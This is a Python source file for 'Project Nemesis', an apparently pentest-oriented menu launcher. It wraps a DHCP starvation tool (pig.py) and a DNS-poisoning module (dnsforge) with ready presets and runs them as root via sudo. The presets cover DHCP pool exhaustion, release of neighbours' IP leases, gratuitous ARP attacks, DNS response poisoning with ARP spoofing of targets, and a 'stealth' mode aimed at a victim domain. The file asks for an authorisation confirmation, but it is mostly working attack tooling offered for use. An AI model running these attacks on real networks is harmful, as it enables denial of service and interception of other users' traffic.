#!/usr/bin/env python3
import os
import sys
import subprocess
import logging
from pathlib import Path

VERSION = "3.0.0"
LOG_FILE = Path.home() / ".nemesis.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

SCRIPT_DIR = Path(__file__).resolve().parent
PIG_SCRIPT = SCRIPT_DIR / "DHCP" / "pig.py"
DNSFORGE_MODULE = "DNS"

if not PIG_SCRIPT.is_file():
    sys.exit(f"ERROR: {PIG_SCRIPT} not found.\n"
             "Make sure pig.py is inside the DHCP folder next to this script.")

sys.path.insert(0, str(SCRIPT_DIR))
try:
    __import__(DNSFORGE_MODULE)
except ImportError:
    sys.exit(f"ERROR: {DNSFORGE_MODULE} module not found in {SCRIPT_DIR}\n"
             "Make sure dnsforge.py is inside the DNS folder.")

class Colors:
    RED = "\033[1;31m"
    MUTED = "\033[0;31m"
    CYAN = "\033[1;36m"
    YELLOW = "\033[1;33m"
    GREEN = "\033[1;32m"
    BOLD = "\033[1m"
    RESET = "\033[0m"
    HLINE = "─"
    VLINE = "│"
    TOPL = "┌"
    TOPR = "┐"
    BOTL = "└"
    BOTR = "┘"

if not sys.stdout.isatty():
    for attr in dir(Colors):
        if not attr.startswith("_") and isinstance(getattr(Colors, attr), str):
            setattr(Colors, attr, "")
    Colors.HLINE = "-"
    Colors.VLINE = "|"
    Colors.TOPL = "+"
    Colors.TOPR = "+"
    Colors.BOTL = "+"
    Colors.BOTR = "+"

def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")

def banner(text):
    width = 60
    print(f"{Colors.RED}{Colors.TOPL}{Colors.HLINE * (width - 2)}{Colors.TOPR}")
    pad = (width - 2 - len(text)) // 2
    print(f"{Colors.VLINE}{' ' * pad}{Colors.BOLD}{text}{Colors.RESET}{Colors.RED}"
          f"{' ' * (width - 2 - len(text) - pad)}{Colors.VLINE}")
    print(f"{Colors.BOTL}{Colors.HLINE * (width - 2)}{Colors.BOTR}{Colors.RESET}")

def logo():
    clear_screen()
    print(f"""{Colors.RED}
███╗   ██╗███████╗███╗   ███╗███████╗███████╗██╗███████╗
████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██║██╔════╝
██╔██╗ ██║█████╗  ██╔████╔██║█████╗  ███████╗██║███████╗
██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ╚════██║██║╚════██║
██║ ╚████║███████╗██║ ╚═╝ ██║███████╗███████║██║███████║
╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝╚══════╝
{Colors.RESET}""")
    print(f"{Colors.MUTED}               Windows Services Security Pentest Project{Colors.RESET}\n")

def pause():
    input(f"\n{Colors.MUTED}Press Enter to return...{Colors.RESET}")

def log_access(module):
    logging.info(module)

def confirm_attack(attack_desc):
    print(f"\n{Colors.RED}You are about to run:{Colors.RESET}")
    print(f"  {Colors.BOLD}{attack_desc}{Colors.RESET}")
    print(f"{Colors.RED}This requires root and must ONLY be done on authorised networks.{Colors.RESET}")
    answer = input(f"{Colors.CYAN}Type 'yes' to confirm: {Colors.RESET}").strip().lower()
    return answer in ("y", "yes", "yep", "yeah")

class InterfaceManager:
    def __init__(self):
        self._saved_iface = None

    def get_interface(self):
        if self._saved_iface:
            use = input(f"{Colors.CYAN}Use saved interface {Colors.BOLD}{self._saved_iface}"
                        f"{Colors.RESET}{Colors.CYAN}? [Y/n]: {Colors.RESET}").strip().lower()
            if use not in ("n", "no"):
                return self._saved_iface
        iface = input(f"{Colors.CYAN}Network interface (e.g. eth0, vboxnet0): {Colors.RESET}").strip()
        if iface:
            self._saved_iface = iface
            return iface
        return None

iface_mgr = InterfaceManager()

def run_command(cmd, attack_type):
    desc = " ".join(cmd)
    clear_screen()
    logo()
    banner(f"Execute {attack_type} Attack")
    print(f"\n{Colors.YELLOW}Command:{Colors.RESET}\n  {desc}")
    print(f"{Colors.GREEN}{'━' * 50}{Colors.RESET}")
    if not confirm_attack(desc):
        print(f"{Colors.MUTED}Attack cancelled.{Colors.RESET}")
        pause()
        return
    print(f"\n{Colors.CYAN}Launching attack... (Press Ctrl+C to stop){Colors.RESET}")
    try:
        if os.geteuid() != 0:
            subprocess.run(["sudo"] + cmd, cwd=str(SCRIPT_DIR))
        else:
            subprocess.run(cmd, cwd=str(SCRIPT_DIR))
    except KeyboardInterrupt:
        print(f"\n{Colors.MUTED}Attack interrupted.{Colors.RESET}")
    print(f"\n{Colors.GREEN}Attack finished.{Colors.RESET}")
    pause()

class DHCPAttacks:
    @staticmethod
    def run(args):
        iface = DHCPAttacks._extract_iface(args)
        if not iface:
            iface = iface_mgr.get_interface()
            if not iface:
                print(f"{Colors.RED}No interface given, aborting.{Colors.RESET}")
                return
            args.extend(["-i", iface])
        else:
            iface_mgr._saved_iface = iface
        cmd = [str(PIG_SCRIPT)] + args
        run_command(cmd, "DHCP")

    @staticmethod
    def _extract_iface(args):
        try:
            idx = args.index("-i")
            return args[idx + 1]
        except (ValueError, IndexError):
            return None

    @staticmethod
    def quick_menu():
        while True:
            clear_screen()
            logo()
            banner("Quick DHCP Attack Profiles")
            print(f"""{Colors.YELLOW}
  [1] Basic exhaustion
  [2] Verbose exhaustion (v99)
  [3] Exhaustion + gratuitous ARP
  [4] Exhaustion + release neighbour IPs
  [5] Custom MAC list
  [6] DHCPv6 exhaustion
  [7] Fuzz mode
  [8] Multi-threaded (8 threads) + verbose
  [0] Back
{Colors.RESET}""")
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            if choice == "1":
                DHCPAttacks.run([])
            elif choice == "2":
                DHCPAttacks.run(["-v", "99"])
            elif choice == "3":
                DHCPAttacks.run(["-g"])
            elif choice == "4":
                DHCPAttacks.run(["-r"])
            elif choice == "5":
                macs = input(f"{Colors.CYAN}Enter MACs (comma separated): {Colors.RESET}").strip()
                if macs:
                    DHCPAttacks.run(["-s", macs])
            elif choice == "6":
                DHCPAttacks.run(["-6"])
            elif choice == "7":
                DHCPAttacks.run(["-f"])
            elif choice == "8":
                DHCPAttacks.run(["-t", "8", "-v", "99"])
            elif choice == "0":
                break
            else:
                print(f"{Colors.RED}Invalid option.{Colors.RESET}")

    @staticmethod
    def advanced_wizard():
        args = []
        clear_screen()
        logo()
        banner("Advanced DHCP Attack Configuration")
        print(f"{Colors.MUTED}Configure each option. Leave empty for default.{Colors.RESET}\n")

        verb = input(f"{Colors.CYAN}Verbosity (0-99, default 10): {Colors.RESET}").strip()
        if verb: args.extend(["-v", verb])

        if input(f"{Colors.CYAN}IPv6 mode? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("-6")
            if input(f"{Colors.CYAN}  RapidCommit? [y/N]: {Colors.RESET}").strip().lower() == "y":
                args.append("-1")

        macs = input(f"{Colors.CYAN}Custom MAC list (comma separated): {Colors.RESET}").strip()
        if macs: args.extend(["-s", macs])

        if input(f"{Colors.CYAN}Identical Ethernet & DHCP MAC? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("-S")

        req_opts = input(f"{Colors.CYAN}Custom request options (e.g. 21,22,23): {Colors.RESET}").strip()
        if req_opts: args.extend(["-O", req_opts])

        if input(f"{Colors.CYAN}Fuzzing? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("-f")

        threads = input(f"{Colors.CYAN}Threads (default 1): {Colors.RESET}").strip()
        if threads: args.extend(["-t", threads])

        for opt, flag in [("Show ARP who-has?", "-a"), ("Show ICMP requests?", "-i"),
                          ("Show lease options?", "-o"), ("Show lease confirmations?", "-l"),
                          ("Gratuitous ARP neighbor attack?", "-g"),
                          ("Release all neighbor IPs?", "-r"), ("ARP neighbor scan?", "-n")]:
            if input(f"{Colors.CYAN}{opt} [y/N]: {Colors.RESET}").strip().lower() == "y":
                args.append(flag)

        t_spawn = input(f"{Colors.CYAN}Thread spawn timeout (default 0.4): {Colors.RESET}").strip()
        if t_spawn: args.extend(["-x", t_spawn])
        t_dos = input(f"{Colors.CYAN}DOS timeout (default 8): {Colors.RESET}").strip()
        if t_dos: args.extend(["-y", t_dos])
        t_dhcp = input(f"{Colors.CYAN}DHCP request timeout (default 2): {Colors.RESET}").strip()
        if t_dhcp: args.extend(["-z", t_dhcp])

        if input(f"{Colors.CYAN}Colored output? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("-c")

        DHCPAttacks._final_review(args, lambda a: DHCPAttacks.run(a))

    @staticmethod
    def _final_review(args, run_func):
        while True:
            clear_screen()
            logo()
            banner("Final Command")
            print(f"{Colors.YELLOW}Current arguments:{Colors.RESET}")
            print(f"  {' '.join(args) if args else '(none)'}")
            print(f"\n{Colors.CYAN}[E]dit manually, [R]un, [A]bort: {Colors.RESET}")
            choice = input().strip().lower()
            if choice in ("e", "edit"):
                new_args = input(f"{Colors.CYAN}Enter replacement arguments: {Colors.RESET}").strip().split()
                if new_args:
                    args.clear()
                    args.extend(new_args)
            elif choice in ("r", "run"):
                run_func(args)
                return
            elif choice in ("a", "abort"):
                print(f"{Colors.MUTED}Wizard cancelled.{Colors.RESET}")
                pause()
                return
            else:
                print(f"{Colors.RED}Invalid choice.{Colors.RESET}")

    @staticmethod
    def raw_args():
        raw = input(f"{Colors.CYAN}Enter raw arguments: {Colors.RESET}").strip()
        if raw:
            DHCPAttacks.run(raw.split())
        else:
            print(f"{Colors.RED}No arguments.{Colors.RESET}")

    @staticmethod
    def main_menu():
        while True:
            clear_screen()
            logo()
            banner("DHCP Attack Lab")
            print(f"""{Colors.YELLOW}
  [1] Quick Attack (presets)
  [2] Advanced Configuration (wizard)
  [3] Enter raw pig.py arguments
  [0] Return to main menu
{Colors.RESET}""")
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            if choice == "1":
                DHCPAttacks.quick_menu()
            elif choice == "2":
                DHCPAttacks.advanced_wizard()
            elif choice == "3":
                DHCPAttacks.raw_args()
            elif choice == "0":
                break
            else:
                print(f"{Colors.RED}Invalid option.{Colors.RESET}")

class DNSAttacks:
    @staticmethod
    def run(args):
        mode = None
        if "respond" in args:
            mode = "respond"
            args.remove("respond")
        elif "relay" in args:
            mode = "relay"
            args.remove("relay")
        else:
            print(f"{Colors.YELLOW}Select mode:{Colors.RESET}")
            print("  [r] respond (intercept request)")
            print("  [l] relay (intercept response)")
            m = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip().lower()
            if m in ("r", "respond"):
                mode = "respond"
            elif m in ("l", "relay"):
                mode = "relay"
            else:
                print(f"{Colors.RED}Invalid mode, aborting.{Colors.RESET}")
                return

        iface = DNSAttacks._extract_iface(args)
        if not iface:
            iface = iface_mgr.get_interface()
            if not iface:
                print(f"{Colors.RED}No interface given, aborting.{Colors.RESET}")
                return
            args.extend(["-i", iface])
        else:
            iface_mgr._saved_iface = iface

        cmd = ["python3", "-m", DNSFORGE_MODULE] + args + [mode]
        run_command(cmd, "DNS")

    @staticmethod
    def _extract_iface(args):
        for flag in ("-i", "--interface"):
            try:
                idx = args.index(flag)
                return args[idx + 1]
            except (ValueError, IndexError):
                pass
        return None

    @staticmethod
    def quick_menu():
        while True:
            clear_screen()
            logo()
            banner("Quick DNS Attack Profiles")
            print(f"""{Colors.YELLOW}
  [1] Basic respond (poison all queries)
  [2] Basic relay (poison responses)
  [3] Stealth respond (custom domain + authoritative server)
  [4] Respond with ARP spoofing target
  [5] Respond, no ARP spoofing
  [0] Back
{Colors.RESET}""")
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            if choice == "1":
                pip = input(f"{Colors.CYAN}Poison IP: {Colors.RESET}").strip()
                if pip: DNSAttacks.run(["-p", pip])
            elif choice == "2":
                pip = input(f"{Colors.CYAN}Poison IP: {Colors.RESET}").strip()
                if pip: DNSAttacks.run(["-p", pip, "relay"])
            elif choice == "3":
                pip = input(f"{Colors.CYAN}Poison IP: {Colors.RESET}").strip()
                dns_srv = input(f"{Colors.CYAN}Authoritative DNS server IP: {Colors.RESET}").strip()
                domain = input(f"{Colors.CYAN}Victim domain: {Colors.RESET}").strip()
                if pip and dns_srv and domain:
                    DNSAttacks.run(["-p", pip, "-s", "-ds", dns_srv, "-d", domain])
            elif choice == "4":
                pip = input(f"{Colors.CYAN}Poison IP: {Colors.RESET}").strip()
                tgt = input(f"{Colors.CYAN}Target IP for ARP spoofing: {Colors.RESET}").strip()
                if pip and tgt: DNSAttacks.run(["-p", pip, "-t", tgt])
            elif choice == "5":
                pip = input(f"{Colors.CYAN}Poison IP: {Colors.RESET}").strip()
                if pip: DNSAttacks.run(["-p", pip, "--no-arp-spoof"])
            elif choice == "0":
                break
            else:
                print(f"{Colors.RED}Invalid option.{Colors.RESET}")

    @staticmethod
    def advanced_wizard():
        args = []
        clear_screen()
        logo()
        banner("Advanced DNS Attack Configuration")
        print(f"{Colors.MUTED}Configure each option. Leave empty to skip.{Colors.RESET}\n")

        m = input(f"{Colors.CYAN}Mode: [r] respond / [l] relay: {Colors.RESET}").strip().lower()
        mode = "respond" if m in ("r", "respond") else "relay"

        pip = input(f"{Colors.CYAN}Poison IP (e.g. 192.168.1.100): {Colors.RESET}").strip()
        if not pip:
            print(f"{Colors.RED}Poison IP is required. Aborting.{Colors.RESET}")
            return
        args.extend(["-p", pip])

        qnames = input(f"{Colors.CYAN}DNS query name(s) (comma separated): {Colors.RESET}").strip()
        if qnames: args.extend(["-q", qnames])

        ttl = input(f"{Colors.CYAN}TTL in seconds: {Colors.RESET}").strip()
        if ttl: args.extend(["-ttl", ttl])

        if input(f"{Colors.CYAN}Enable stealth mode? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("-s")
            dns_srv = input(f"{Colors.CYAN}  Authoritative DNS server IP: {Colors.RESET}").strip()
            if dns_srv: args.extend(["-ds", dns_srv])
            domain = input(f"{Colors.CYAN}  Victim domain: {Colors.RESET}").strip()
            if domain: args.extend(["-d", domain])

        tgt = input(f"{Colors.CYAN}ARP spoofing target IP (leave empty to skip): {Colors.RESET}").strip()
        if tgt:
            args.extend(["-t", tgt])
        elif input(f"{Colors.CYAN}Use target file instead? [y/N]: {Colors.RESET}").strip().lower() == "y":
            tfile = input(f"{Colors.CYAN}Path to target file: {Colors.RESET}").strip()
            if tfile: args.extend(["-tf", tfile])

        if input(f"{Colors.CYAN}Disable ARP spoofing completely? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("--no-arp-spoof")

        if input(f"{Colors.CYAN}Verbose output? [y/N]: {Colors.RESET}").strip().lower() == "y":
            args.append("-v")

        DHCPAttacks._final_review(args + [mode], lambda a: DNSAttacks.run(a))

    @staticmethod
    def raw_args():
        raw = input(f"{Colors.CYAN}Enter raw arguments (including mode): {Colors.RESET}").strip()
        if raw:
            DNSAttacks.run(raw.split())
        else:
            print(f"{Colors.RED}No arguments.{Colors.RESET}")

    @staticmethod
    def main_menu():
        while True:
            clear_screen()
            logo()
            banner("DNS Attack Lab (dnsforge)")
            print(f"""{Colors.YELLOW}
  [1] Quick Attack (presets)
  [2] Advanced Configuration (wizard)
  [3] Enter raw dnsforge arguments
  [0] Return to main menu
{Colors.RESET}""")
            choice = input(f"{Colors.CYAN}Choice: {Colors.RESET}").strip()
            if choice == "1":
                DNSAttacks.quick_menu()
            elif choice == "2":
                DNSAttacks.advanced_wizard()
            elif choice == "3":
                DNSAttacks.raw_args()
            elif choice == "0":
                break
            else:
                print(f"{Colors.RED}Invalid option.{Colors.RESET}")

def main_menu():
    while True:
        clear_screen()
        logo()
        banner("Security Learning Dashboard")
        print(f"""{Colors.YELLOW}
  [1] DHCP Attack Lab
  [2] DNS Attack Lab
  [0] Exit
{Colors.RESET}""")
        choice = input(f"{Colors.CYAN}Select a module: {Colors.RESET}").strip()
        if choice == "1":
            DHCPAttacks.main_menu()
        elif choice == "2":
            DNSAttacks.main_menu()
        elif choice in ("0", "q", "Q", "exit"):
            clear_screen()
            print(f"{Colors.MUTED}Stay curious. Stay authorized.{Colors.RESET}")
            break
        else:
            print(f"{Colors.RED}Please select a listed option.{Colors.RESET}")

def handle_arg(arg):
    arg = arg.lower()
    if arg in ("dhcplab", "dhcp", "attack", "7"):
        DHCPAttacks.main_menu()
    elif arg in ("dnsattack", "dns", "8"):
        DNSAttacks.main_menu()
    elif arg in ("-h", "--help"):
        print(f"""Project Nemesis v{VERSION}
Usage: {sys.argv[0]} [module]
Modules:
  dhcplab / attack   DHCP Attack Lab
  dnsattack          DNS Attack Lab
  -h, --help         Show this help
  --version          Show version
""")
    elif arg == "--version":
        print(f"Project Nemesis v{VERSION}")
    else:
        print(f"Unknown module: {arg}", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        handle_arg(sys.argv[1])
    else:
        main_menu()